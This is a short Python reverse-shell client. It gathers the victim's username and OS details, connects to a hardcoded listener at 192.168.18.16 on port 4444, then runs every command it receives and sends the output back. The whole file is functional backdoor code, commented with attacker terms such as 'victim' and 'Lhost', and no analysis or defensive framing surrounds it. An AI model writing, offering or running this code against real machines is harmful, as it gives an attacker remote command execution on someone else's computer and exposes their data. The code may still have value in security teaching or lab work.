from socket import *
from getpass import getuser
import subprocess
import platform
import os
# fetch victim information
get_os = platform = platform.uname()
get_user = getuser()
os_info = "client_name: "+str(get_user)+" <-> "+"client_os: "+str(get_os)
# Lhost and lport
HOST = "192.168.18.16"
PORT = 4444
# connection configuration
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((HOST, PORT))
connection.send(os_info.encode())
# payload execution
while True:
    receiver = connection.recv(1024).decode()
    if receiver == "exit":
        exit()
    elif receiver[:2] == "cd":
        os.chdir(receiver[3:])
        connection.send(os.getcwd().encode())
    else:
        out_put = subprocess.getoutput(receiver)
        if out_put =="" or out_put == None:
            output="----"
            connection.send(out_put.encode())
        else:
            connection.send(out_put.encode())